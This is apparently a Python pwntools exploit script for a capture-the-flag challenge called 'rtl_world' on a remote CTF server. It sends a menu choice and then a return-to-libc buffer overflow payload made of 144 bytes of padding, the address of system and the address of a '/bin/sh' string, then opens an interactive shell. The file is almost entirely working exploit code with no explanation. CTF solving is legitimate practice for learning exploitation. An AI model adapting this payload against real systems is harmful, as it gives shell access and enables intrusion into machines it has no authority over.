from pwn import *

#context.arch = 'i386'
#context.terminal=['tmux', 'splitw', '-h']

#p = process("./rtl_world")
p = remote('ctf.j0n9hyun.xyz' ,3010)
e = ELF("./rtl_world")
#gdb.attach(p, 'b*0x08048bec')
#pop_ret = 0x8048545

system = 0x80485b0
binsh = 0x8048eb1

print p.recv(1024)
p.sendline(str(5))
print p.recvuntil("[Attack] > ")

payload = ''
payload += "A"*144
payload += p32(system)
payload += "AAAA"
payload += p32(binsh)

p.sendline(payload)
p.interactive()